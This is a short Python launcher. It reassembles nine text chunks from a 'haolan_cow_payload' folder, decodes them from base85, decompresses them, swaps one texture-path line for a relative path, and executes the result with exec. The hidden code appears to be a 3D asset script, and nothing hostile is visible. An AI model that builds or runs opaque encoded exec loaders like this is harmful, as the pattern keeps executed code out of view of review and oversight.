#!/usr/bin/env python3
from __future__ import annotations

import base64
import zlib
from pathlib import Path

payload_dir = Path(__file__).resolve().parent / "haolan_cow_payload"
payload = "".join((payload_dir / f"{index:02d}.txt").read_text(encoding="ascii") for index in range(9))
source = zlib.decompress(base64.b85decode(payload))
source = source.decode("utf-8").replace('abs_name = str(texture_paths[material]).replace("\\\\", "/")', "abs_name = rel")
exec(compile(source, str(Path(__file__).resolve()), "exec"))
